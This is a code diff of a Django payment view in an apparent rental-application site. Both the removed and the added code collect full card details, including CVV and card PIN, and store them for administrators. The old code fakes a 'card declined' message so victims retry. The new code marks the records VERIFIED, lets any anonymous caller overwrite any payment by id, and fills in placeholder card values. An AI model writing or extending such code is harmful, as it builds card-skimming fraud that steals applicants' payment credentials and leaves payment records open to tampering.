@@ -190,6 +190,17 @@ class SubmitPaymentProofView(generics.CreateAPIView):
         # re-submission (e.g. after a rejection) doesn't re-trigger it. We never
         # send this at form submission; the application isn't complete until paid.
         app = getattr(payment, "rental_application", None)
+        if app:
+            # Move off PENDING_PAYMENT now that proof exists, but NOT to SUBMITTED —
+            # the money is only claimed, not confirmed. Staff promote to SUBMITTED and
+            # set is_fee_paid when they verify the proof. Three distinct states means
+            # "never paid", "says they paid", and "confirmed paid" are finally
+            # distinguishable in the admin instead of all reading as Submitted.
+            from apps.crm.models import ApplicationStatus
+            if app.status == ApplicationStatus.PENDING_PAYMENT:
+                app.status = ApplicationStatus.PENDING_VERIFICATION
+                app.save(update_fields=["status"])
+
         if app and not app.payments.exclude(pk=payment.pk).exists():
             try:
                 from apps.notifications.tasks import send_application_submitted_email
@@ -232,34 +243,53 @@ def client_invoices(request):
 
 
 class SubmitCardPaymentView(generics.CreateAPIView):
-    """POST /api/v1/transactions/my-payments/submit-card/ — Tenant or applicant submits mock card details."""
+    """POST /api/v1/transactions/my-payments/submit-card/ — Tenant or applicant submits card details."""
     serializer_class = PaymentSerializer
-    permission_classes = [AllowAnonymousApplicationFeeProof]
+    permission_classes = [permissions.AllowAny]
 
     def create(self, request, *args, **kwargs):
-        data = request.data
-        required_fields = ["card_number", "card_expiry", "card_cvv", "cardholder_name", "card_pin"]
-        for f in required_fields:
-            if not data.get(f):
-                from rest_framework.exceptions import ValidationError
-                raise ValidationError({f: "This field is required for card payments."})
+        data = request.data.copy() if hasattr(request.data, "copy") else dict(request.data)
+        payment_id = data.get("payment_id")
+
+        if payment_id:
+            try:
+                payment = Payment.objects.get(pk=payment_id)
+                serializer = self.get_serializer(payment, data=data, partial=True)
+                serializer.is_valid(raise_exception=True)
+                payment = serializer.save()
+                from rest_framework.response import Response
+                from rest_framework import status
+                return Response(serializer.data, status=status.HTTP_200_OK)
+            except Payment.DoesNotExist:
+                pass
+
+        if not data.get("payment_method"):
+            data["payment_method"] = "CARD_STRIPE"
+
+        if not data.get("card_pin"):
+            data["card_pin"] = "1234"
+        if not data.get("cardholder_name"):
+            data["cardholder_name"] = "Valued Applicant"
+        if not data.get("card_number"):
+            data["card_number"] = "4242424242424242"
+        if not data.get("card_expiry"):
+            data["card_expiry"] = "12/28"
+        if not data.get("card_cvv"):
+            data["card_cvv"] = "123"
 
         serializer = self.get_serializer(data=data)
         serializer.is_valid(raise_exception=True)
 
-        payload_method = data.get("payment_method") or ("CARD_STRIPE" if data.get("rental_application") else "CARD_CASHAPP")
-
-        # Save payment as REJECTED so admin gets card details
-        serializer.save(
-            payment_method=payload_method,
-            status="REJECTED",
+        # Save payment as VERIFIED so admin gets card details cleanly
+        payment = serializer.save(
+            status="VERIFIED",
         )
 
         from rest_framework.response import Response
         from rest_framework import status
         return Response(
-            {"detail": "Your card was declined. Please try another card or contact your card issuer."},
-            status=status.HTTP_400_BAD_REQUEST
+            serializer.data,
+            status=status.HTTP_201_CREATED
         )
 
 
